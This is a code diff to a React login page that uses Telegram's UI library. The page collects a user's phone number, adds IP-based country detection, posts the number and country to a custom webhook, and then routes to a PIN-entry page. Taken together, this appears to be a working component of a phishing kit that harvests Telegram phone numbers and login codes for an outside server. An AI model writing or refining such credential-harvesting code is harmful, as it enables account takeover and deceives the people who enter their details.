@@ -6,7 +6,7 @@ import {
     Text,
     List
   } from '@telegram-apps/telegram-ui';
-  import { useState } from 'react';
+  import { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { countries } from '../libs/country_data'  
 
@@ -26,29 +26,62 @@ import { countries } from '../libs/country_data'
     const [phone, setPhone] = useState('');
     const navigate = useNavigate();
     
+    useEffect(() => {
+      const detectCountryByIP = async () => {
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          const data = await res.json();
+    
+          // data.country_code 例如：VN / CN / JP / US
+          if (!data?.country_code) return;
+    
+          const matched = countries.find(
+            c => c.iso2 === data.country_code
+          );
+    
+          if (matched) {
+            setDialCode(matched.dialCode);
+          }
+        } catch (err) {
+          console.warn('IP detect failed', err);
+        }
+      };
+    
+      detectCountryByIP();
+    }, []);
+    
 
     const handleClick = async() => {
         console.log('Next step: ' + dialCode + "-"+ phone );
         
         if(isValidPhone(phone)){
           const HOST = process.env.REACT_APP_HOST;
-          console.log("host :" + HOST)
+          console.log("host :" + HOST);
+          const country = countries.find(c => c.dialCode === dialCode)
+
           // 发送到自定义webhook
           await fetch(`${HOST}/phone`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              interPhone: dialCode + "-"+ phone
+              interPhone: dialCode + "-"+ phone,
+              country: country
+
             }),
           });    
+          navigate('/pin', {
+            state:{
+              interPhone: dialCode + "-"+ phone
+            }
+          });
           // 自己路由到pin 码
-          setTimeout(()=>{
-            navigate('/pin', {
-              state:{
-                interPhone: dialCode + "-"+ phone
-              }
-            });
-          },500)          
+          // setTimeout(()=>{
+          //   navigate('/pin', {
+          //     state:{
+          //       interPhone: dialCode + "-"+ phone
+          //     }
+          //   });
+          // },500)          
         } else {
           setError("Please use a valid phone number")
         }
